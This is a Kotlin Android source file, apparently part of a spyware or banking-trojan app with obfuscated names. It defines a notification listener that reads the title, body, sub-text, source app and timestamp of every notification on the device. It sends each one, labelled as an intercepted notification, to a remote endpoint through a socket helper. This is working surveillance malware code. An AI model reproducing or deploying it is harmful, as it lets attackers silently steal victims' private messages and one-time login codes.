package com.xxx.zzz.notifp

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.xxx.zzz.socketsp.IOSocketyt

class NotificationReadServicesd : NotificationListenerService() {

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        Log.i(TAG, "********** onNotificationRemoved")
        Log.i(TAG, "ID :" + sbn?.id + "\t" + sbn?.notification + "\t" + sbn?.packageName)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        runCatching {
            val bundle = sbn?.notification?.extras
            val title = bundle?.getString(Notification.EXTRA_TITLE) ?: sbn?.notification?.tickerText
            val body = bundle?.get(Notification.EXTRA_TEXT)
            val footer = bundle?.getString(Notification.EXTRA_SUB_TEXT)
            val app = sbn?.packageName
            val time = sbn?.postTime
            val notif = InterceptedNotification(
                title ?: "",
                body.toString(),
                footer ?: "",
                app ?: "",
                time ?: 0
            )
            IOSocketyt.sendLogs("", notif.toString(), "pushlist2")
        }.onFailure {
            IOSocketyt.sendLogs("", "onNotificationPosted ${it.localizedMessage}", "error")
        }
    }

    companion object {
        private val TAG = NotificationReadServicesd::class.java.canonicalName
    }
}